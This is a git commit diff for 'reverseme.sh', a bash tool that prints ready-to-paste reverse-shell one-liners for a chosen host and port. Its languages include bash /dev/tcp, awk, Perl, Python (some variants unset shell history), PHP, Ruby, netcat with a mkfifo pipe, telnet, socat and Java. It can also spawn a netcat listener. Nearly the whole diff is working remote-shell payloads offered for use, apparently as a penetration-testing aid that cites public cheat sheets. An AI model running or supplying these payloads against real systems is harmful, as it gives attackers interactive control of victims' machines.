68b330d2dbe90e0874c64b505a338f0d67e7513b
Matt <mgreer906@gmail.com>
2019-07-05 12:40:39 -0400

    Update reverseme.sh
    Fixed minor errors
    Added awk revese shell
    Added socat reverse shell
    Updated arguments
    Updated help menu
    Updated version number
    Updated logic on how IP's and ports are handled. Updated logic on -S (selection argument)

--- reverseme.sh
+++ reverseme.sh
@@ -5,190 +5,324 @@
 ######## Written by Matthew Greer ########
 ######## J>^v ########
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-NC='\033[0m'
+RED='\033[0;31m' # Display titles
+GREEN='\033[0;32m' # Display helpful information
+NC='\033[0m' # Default color
 
-IP='ATTACK-IP-GOES-HERE'
-PORT=ATTACK-PORT-GOES-HERE
+clear # clear the screen place # before clear, if you want to disable this option
 
-clear # clear the screen
-
+# Display bash shells
 function bash() {
-	printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\n\n"
+    printf "bash -i >& /dev/tcp/${HOST}/${LPORT} 0>&1"
 
-	printf "exec /bin/bash 0&0 2>&0\n\n"
+    printf "\n\n"
 
-	printf "0<&196;exec 196<>/dev/tcp/${IP}/${PORT}; sh <&196 >&196 2>&196\n\n"
+    printf "exec /bin/bash 0&0 2>&0"
 
-	printf "exec 5<>/dev/tcp/${IP}/${PORT} cat <&5 | while read line; do $line 2>&5 >&5; done"
+    printf "\n\n"
 
-	printf "\n\n"
+    printf "0<&196;exec 196<>/dev/tcp/${HOST}/${LPORT}; sh <&196 >&196 2>&196"
+
+    printf "exec 5<>/dev/tcp/${HOST}/${LPORT} cat <&5 | while read line; do $line 2>&5 >&5; done"
+
+    printf "\n\n"
 }
 
+function awk() {
+    printf "\n\t${RED}##########${NC}AWK SHELL(S)${RED}##########${NC}\n\n"
+
+    printf "awk 'BEGIN {s = \"/inet/tcp/0/${HOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+
+    printf "\n\n"
+}
+
+# Display perl shells
 function perl() {
-	printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "perl -e 'use Socket;$i=\"${IP}\";$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n"
+    printf "perl -e 'use Socket;$i=\"${HOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 
-	printf "${GREEN} LINUX: ${NC}\n"
+    printf "\n\n"
 
-	printf "\tperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n"
+    printf "${GREEN} LINUX: ${NC}\n"
 
-	printf "${GREEN} WINDOWS: ${NC}\n"
+    printf "\tperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${HOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
 
-	printf "\tperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    printf "\n\n"
 
-	printf "\n\n"
+    printf "${GREEN} WINDOWS: ${NC}\n"
+
+    printf "\tperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${HOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+
+    printntf "\n\n"
 }
 
+# Display python shells
 function python() {
-	printf "\n\t${RED}##########${NC}PYTHON SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}PYTHON SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    printf "${GREEN} TCP: ${NC}\n"
+    printf "\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
-	printf "\n\n"
+    printf "\n\n"
+
+    printf "${GREEN} STCP: ${NC}\n"
+    printf "\tpython -c 'import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();exit();'"
+    
+    printf "\n\n"
+
+    printf "${GREEN} UDP: ${NC}\n"
+    printf "\tpython -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();'"
+
+    printf "\n\n"
 }
 
-
+# Display php shells
 function php() {
-	printf "\n\t${RED}##########${NC}PHP SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}PHP SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "php -r '$sock=fsockopen(\"${IP}\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    printf "php -r '$sock=fsockopen(\"${HOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
-	printf "\n\n"
+    printf "\n\n"
 }
 
+# Display ruby shells
 function ruby() {
-	printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "ruby -rsocket -e'f=TCPSocket.open(\"${IP}\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n\n"
+    printf "ruby -rsocket -e'f=TCPSocket.open(\"${HOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 
-	printf "${GREEN} LINUX: ${NC}\n"
+    printf "\n\n"
 
-	printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n"
+    printf "${GREEN} LINUX: ${NC}\n"
 
-	printf "${GREEN} WINDOWS: ${NC}\n"
+    printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${HOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 
-	printf "\truby -rsocket -e 'c=TCPSocket.new(\"${IP}\",\"${PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    printf "\n\n"
 
-	printf "\n\n"
+    printf "${GREEN} WINDOWS: ${NC}\n"
+
+    printf "\truby -rsocket -e 'c=TCPSocket.new(\"${HOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+
+    printf "\n\n"
 }
 
+# Display netcat shells
 function netcat() {
-	printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "nc -e /bin/sh ${IP} ${PORT}\n\n"
+    printf "nc -e /bin/sh ${HOST} ${LPORT}"
 
-	printf "nc -c /bin/sh ${IP} ${PORT}\n\n"
+    printf "\n\n"
 
-	printf "/bin/sh | nc ${IP} ${PORT}\n\n"
+    printf "nc -c /bin/sh ${HOST} ${LPORT}"
 
-	printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f"
+    printf "\n\n"
 
-	printf "\n\n"
+    printf "/bin/sh | nc ${HOST} ${LPORT}"
+
+    printf "\n\n"
+
+    printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${HOST} ${LPORT} >/tmp/f"
+
+    printf "\n\n"
 }
 
+# Display telnet shells
 function telnet() {
-	printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${IP} ${PORT} 0/tmp/p\n\n"
+    printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${HOST} ${LPORT} 0/tmp/p"
 
-	printf "${GREEN} Listen on machine on port 4445/tcp ${NC}\n"
+    printf "\n\n"
 
-	printf "\ttelnet ${IP} ${PORT} | /bin/bash | telnet ${IP} 4445"
+    printf "${GREEN} Listen on machine on port 4445/tcp ${NC}\n"
 
-	printf "\n\n"
+    printf "\ttelnet ${HOST} ${LPORT} | /bin/bash | telnet ${HOST} 4445"
+
+    printf "\n\n"
 }
 
+function socat() {
+    printf "\n\t${RED}##########${NC}SOCAT SHELL(S)${RED}##########${NC}\n\n"
+
+    printf "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${HOST}:${LPORT}"
+
+    printf "\n\n"
+}
+# Display java shells
 function java() {
-	printf "\n\t${RED}##########${NC}JAVA SHELL(S)${RED}##########${NC}\n\n"
+    printf "\n\t${RED}##########${NC}JAVA SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "r = Runtime.getRuntime()\n"
-	printf "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${IP}/${PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n"
-	printf "p.waitFor()"
+    printf "r = Runtime.getRuntime()"
+    printf "\n"
+    printf "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${HOST}/${LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])"
+    printf "\n"
+    printf "p.waitFor()"
 
-	printf "\n\n"
+    printf "\n\n"
 
 }
 
+# Spawn nc listener with -l option
+function spawn_listener() {
+    gnome-terminal -e "nc -lvp ${LPORT}"
+
+}
+
+# Display help menu with -h option
 function help() {
-	printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"
+    printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"
 
-	printf "\n\t-b or --bash to display reverse shells for bash."
-	printf "\n\t-p or --perl to display reverse shells for perl."
-	printf "\n\t-py or --python to display reverse shells for python."	
-	printf "\n\t-P or --php to display reverse shells for php."
-	printf "\n\t-r or --ruby to display reverse shells for ruby."
-	printf "\n\t-n or --netcat to display reverse shells for netcat."
-	printf "\n\t-t or --telnet to display reverse shells for telnet."
-	printf "\n\t-j or --java to display reverse shells for java."
-	printf "\n\t-s or --sources to display sources\n\n"
-}
+    printf "\nreverseme.sh -h Display's this help menu.\n"
 
-function sources() {
-	printf "\n\t${RED}##########${NC}SOURCES${RED}##########${NC}\n\n"
-	printf "${GREEN} PENTEST MONKEY ${NC}\n"
-	printf "\thttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\n"
+    printf "\nreverseme.sh -d Dispaly's list of available shells.\n"
 
-	printf "${GREEN} BERNARDO REVERSE SHELL ONE LINERS ${NC}\n"
-	printf "\thttps://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html"
+    printf "\nUsuage: reverseme.sh -H [HOST] -L [LPORT] -S [REVERSE-SHELL-SELECTION] ${GREEN}OPTIONAL${NC} -l [SPAWN-NC-LISTENER]\n"
 
-	printf "\n\n"
-}
+    printf "\nreverseme.sh -s Display's source information.\n"
 
-if [[ $# -eq 0 ]] ; then
-    help
+    printf "\nreverseme.sh -V Display's version information.\n\n"
+
     exit 0
-fi
+}
 
-while true ; do
-	case "$1" in
-		-b| --bash) 
-		bash ; shift 
-		;;
+# Display sources with -s option
+function sources() {
+    printf "\n\t${RED}##########${NC}SOURCES${RED}##########${NC}\n\n"
+    printf "${GREEN} PENTEST MONKEY ${NC}\n"
+    printf "\thttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\n"
 
-		-p| --perl)
-		perl ; shift
-		;;
+    printf "${GREEN} BERNARDO REVERSE SHELL ONE LINERS ${NC}\n"
+    printf "\thttps://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html\n\n"
 
-		-py| --python)
-		python ; shift
-		;;
+    printf "${GREEN} THE PORTAL OF KNOWLEDGE ${NC}\n"
+    printf "\thttps://alamot.github.io/reverse_shells/?fbclid=IwAR2SaVusp6EzFGtQ47WLYfC9M1dl2UxBx0ulvjhALDQO3OaeCv90ud6Vuzw"
 
-		-P| --php)
-		php ; shift
-		;;
+    printf "\n\n"
 
-		-r| --ruby)
-		ruby ; shift
-		;;
+    exit 0
+}
 
-		-n| --netcat)
-		netcat ; shift
-		;;
+# Display version information with -V option
+function version() {
+    printf "\n\t${RED}##########${NC}VERSION${RED}##########${NC}\n\n"
 
-		-t| --telnet)
-		telnet ; shift
-		;;
+    printf "\nVersion:\t2.2\n\n"
 
-		-j| --java)
-		java ; shift
-		;;
+    exit 0
+}
 
-		-s| --sources)
-		sources ; shift
-		;;
+function displayShells() {
+    printf "\n\t${RED}##########${NC}LIST OF AVAILABLE SHELLS${RED}##########${NC}\n\n"
 
-		-h| -\? | --help)
-		help ; shift
-		break
-		;;
+    printf "\t\t${GREEN}Shell\t Number of shells${NC}\n"
+    printf "\t\t-----\t ----------------\n"
 
-	esac
-	break
+    printf "\t\tBash\t\t(3)\n"
+    printf "\t\tAwk\t\t(1)\n"
+    printf "\t\tPerl\t\t(3)\n"
+    printf "\t\tPython\t\t(3)\n"
+    printf "\t\tPHP\t\t(1)\n"
+    printf "\t\tRuby\t\t(3)\n"
+    printf "\t\tNetcat\t\t(4)\n"
+    printf "\t\tTelnet\t\t(2)\n"
+    printf "\t\tSocat\t\t(1)\n"
+    printf "\t\tJava\t\t(1)\n\n"
+
+    exit 0
+}
+
+while getopts "hsVdH:L:S:l" arg; do
+    case $arg in 
+        h) # help menu
+            help
+            break
+           ;;
+        s) # Display sources
+            sources
+            break
+            ;;
+
+        V) # Display version information
+            version
+            break
+            ;;
+
+        d) # Display list of available shells
+            displayShells
+            break
+            ;;
+
+        H) # set attack RHOST
+            HOST=$OPTARG
+            ;;
+            
+        L) # set lport
+            LPORT=$OPTARG
+            ;;
+            
+        S) # Select what language to display reverse shell in
+            SELECTION=$OPTARG
+            ;;
+
+        l)
+            spawn_listener
+            ;;   
+    esac
 done
 
-	
+# Check if host is valid IP and lport is valid port
+if [[ ! ${HOST} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] ; then
+    printf "Please give valid IP for host!\n\n"
+    exit 1
+elif [[ ! ${LPORT} =~ ^[0-9]{1,5}$ ]] ; then
+    printf "Please give valid port for lport!\n\n"
+    exit 1
+fi
+
+
+if [[ -z ${HOST} ]] || [[ -z ${LPORT} ]] ; then
+    printf "\nPlease specify an attack-ip and/or a listening port!\n\n"
+    exit 1
+
+elif [[ ${HOST} ]]  || [[ ${LPORT} ]] && [[ -z ${SELECTION} ]] ; then
+    printf "\nPlease specify a reverse shell to display!\n\n"
+    exit 1
+
+elif [[ "${SELECTION}" == "bash" ]] || [[ "${SELECTION}" == "BASH" ]] || [[ "${SELECTION}" == "Bash" ]] ; then
+    bash
+
+elif [[ "${SELECTION}" == "awk" ]] || [[ "${SELECTION}" == "AWK" ]] || [[ "${SELECTION}" == "Awk" ]] ; then
+    awk
+
+elif [[ "${SELECTION}" == "perl" ]] || [[ "${SELECTION}" == "PERL" ]] || [[ "${SELECTION}" == "Perl" ]] ; then
+    perl
+    
+elif [[ "${SELECTION}" == "python" ]] || [[ "${SELECTION}" == "PYTHON" ]] || [[ "${SELECTION}" == "Python" ]] ; then
+    python
+
+elif [[ "${SELECTION}" == "php" ]] || [[ "${SELECTION}" == "PHP" ]] || [[ "${SELECTION}" == "Php" ]] ; then
+    php
+
+elif [[ "${SELECTION}" == "ruby" ]] || [[ "${SELECTION}" == "RUBY" ]] || [[ "${SELECTION}" == "Ruby" ]] ; then
+    ruby
+
+elif [[ "${SELECTION}" == "netcat" ]] || [[ "${SELECTION}" == "NETCAT" ]] || [[ "${SELECTION}" == "Netcat" ]] ; then
+    netcat
+
+elif [[ "${SELECTION}" == "telnet" ]] || [[ "${SELECTION}" == "TELNET" ]] || [[ "${SELECTION}" == "Telnet" ]] ; then
+    telnet
+
+elif [[ "${SELECTION}" == "socat" ]] || [[ "${SELECTION}" == "SOCAT" ]] || [[ "${SELECTION}" == "Socat" ]] ; then
+    socat
+
+elif [[ "${SELECTION}" == "java" ]] || [[ "${SELECTION}" == "JAVA" ]] || [[ "${SELECTION}" == "Java" ]] ; then
+    java
+
+else
+    printf "\nNot a valid argument!\n\n"
+    exit 1
+fi
